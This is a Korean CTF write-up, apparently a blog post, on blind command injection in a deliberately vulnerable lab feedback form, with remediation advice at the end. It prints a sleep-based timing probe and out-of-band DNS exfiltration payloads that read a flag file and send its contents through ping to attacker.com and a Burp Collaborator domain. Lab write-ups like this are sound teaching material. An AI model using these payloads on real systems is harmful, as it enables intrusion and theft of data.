+++
title = "VulnABLE CTF [LUXORA] Write-up: Command Injection 🥇 Gold"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Command Injection", "Gold", "Blind", "OOB", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Command Injection 🥇 Gold

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (CMDi)
- **난이도**: 🥇 Gold
- **타겟 경로**: `/cmdi/gold`
- **목표**: 명령어의 실행 결과가 화면에 전혀 노출되지 않는 Blind 환경에서, 네트워크 외부 통신(Out-of-Band, OOB)을 유발하여 시스템 내부의 플래그를 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 반응 분석 (Reconnaissance)

`/cmdi/gold` 페이지는 사용자의 피드백을 서버 로그 파일에 저장하는 기능(Feedback Submission)을 제공합니다.

### 정상 및 비정상 요청 테스트
```http
POST /cmdi/gold
message=hello

POST /cmdi/gold
message=hello; id
```

**[서버의 일관된 응답]**
```html
<p>Message saved to log successfully.</p>
```

**[해커의 사고 과정]**
1. 사용자가 어떤 문자를 넣든 화면에는 동일한 텍스트만 출력된다. `id` 명령어를 넣어도 그 결과가 화면에 나오지 않는다. (전형적인 Blind Command Injection)
2. 먼저 이 폼이 **정말로 명령어를 실행하고 있는지(Vulnerable)** 증명해야 한다.
3. 데이터베이스 인젝션(Time-based) 때처럼 **시간 지연(Time Delay)**을 유도해보자!

---

## 💥 2. 취약점 식별 (Vulnerability Identification)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Input: 8.8.8.8 ; id)--> [ Web Server ]
                                        |-- OS Command Execution
                                        |-- Runs: ping 8.8.8.8 ; id
                                        |-- Returns Output
```


리눅스의 `sleep` 명령어를 주입하여 서버가 대기하는지 확인합니다.

### 지연 페이로드 전송
```http
POST /cmdi/gold
message=hello; sleep 5
```

**[결과 분석]**
페이로드를 전송하자 브라우저의 로딩 표시가 돌기 시작하며, 정확히 **5초 뒤에** "Message saved to log successfully." 응답이 돌아왔습니다.
취약점이 확실히 존재합니다! 이제 데이터를 어떻게 빼낼 것인가가 관건입니다.

---

## 🚀 3. 데이터 추출 전략 설계 (OOB Data Exfiltration)

화면에 결과가 나오지 않으므로, 서버가 해커가 통제하는 외부 서버로 스스로 데이터를 보내게 만들어야 합니다. 이를 **OOB (Out-of-Band) 통신**이라고 합니다.

### 💡 왜 HTTP(curl, wget)가 아닌 DNS(ping)를 사용하는가?
일반적으로 잘 설정된 서버는 보안을 위해 내부망에서 외부 인터넷으로 나가는(Outbound/Egress) 웹 트래픽(포트 80, 443)을 방화벽으로 꽉 막아둡니다. 하지만 도메인 이름을 IP로 바꾸기 위한 **DNS 질의(포트 53)**는 막혀있지 않은 경우가 대다수입니다. 우리는 이 허점을 찌를 것입니다.

### 💡 페이로드 설계 구조
해커가 소유한 도메인(`attacker.com`)의 서브도메인 자리에 우리가 읽어낸 플래그 텍스트를 끼워 넣어 DNS 요청을 날리게 만듭니다.

1. 파일 읽기: `cat flag_gold.txt`
2. 서브도메인 조립 및 DNS 요청(Ping): `ping -c 1 $(cat flag_gold.txt).attacker.com`
   - 만약 플래그가 `FLAG{123}` 이라면, 서버는 `ping -c 1 FLAG{123}.attacker.com`을 실행합니다.
   - 이때 서버는 `FLAG{123}.attacker.com`의 IP를 알기 위해 전 세계 DNS 서버를 거쳐 해커의 DNS 서버로 질의를 던지게 되고, 해커는 그 로그를 보고 플래그를 획득합니다.

---

## 💻 4. 공격 수행 및 익스플로잇 (Exploitation)

OOB 테스트를 위해 **Burp Suite Collaborator** 또는 무료 OOB 서비스(예: `interact.sh`)를 사용하여 해커의 임시 도메인(`abcxyz.burpcollaborator.net`)을 발급받습니다.

### 페이로드 전송
명령어 치환 문법인 백틱(`` ` ``)을 사용하여 페이로드를 만듭니다.

```http
POST /cmdi/gold
Content-Type: application/x-www-form-urlencoded

message=hello; ping -c 1 `cat flag_gold.txt`.abcxyz.burpcollaborator.net
```

### 서버의 응답
화면에는 여전히 에러 없이 `Message saved to log successfully.`만 나타납니다. 하지만...

### 🔍 해커의 OOB 리스너(Burp Collaborator) 로그 확인
해커의 수신 서버 로그 창에 갑자기 새로운 DNS 질의 내역이 뜹니다!

```text
[DNS Query Received]
Time: 2026-03-14 10:15:22
Type: A (A Record IPv4)
Domain: FLAG{CMDI_🥇_BLIND_OOB_E5F6G7}.abcxyz.burpcollaborator.net
Source IP: 10.10.10.10 (Target Server)
```

---

## 🚩 5. 롸잇업 결론 및 플래그

화면 출력을 완전히 차단한 맹인(Blind) 상태에서도, 시스템 기본 네트워크 도구(ping)와 DNS 프로토콜의 특성을 악용하여 부채널(Side-Channel)로 중요 데이터를 완벽하게 유출해 냈습니다.

**🔥 획득한 플래그:**
`FLAG{CMDI_🥇_BLIND_OOB_E5F6G7}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)

* **취약한 방어 논리**
"화면에 에러나 출력을 안 띄워주면 해커가 아무것도 못 하겠지"라는 안일한 생각(Security by Obscurity)이 실패의 원인입니다.

* **안전한 패치 코드 (근본적인 쉘 분리)**
Blind든 아니든 OS 명령어를 직접 호출하는 것은 금물입니다. 로그를 남기고 싶다면 언어의 내장 로깅 라이브러리를 써야 합니다.
```javascript
// 취약한 방식
exec('echo "' + req.body.message + '" >> /var/log/app.log');

// 안전한 방식 (Node.js 기본 fs 모듈 사용)
const fs = require('fs');
fs.appendFile('/var/log/app.log', req.body.message + '\n', (err) => { ... });
```

* **인프라 측면의 방어 (Egress Filtering 강화)**
웹 애플리케이션 서버(WAS)가 인터넷 상의 아무 도메인으로나 자유롭게 DNS 쿼리를 날리거나 통신하지 못하도록, 방화벽(Outbound Rule)을 엄격하게 통제(Zero Trust)해야 OOB 공격의 성립 자체를 막을 수 있습니다.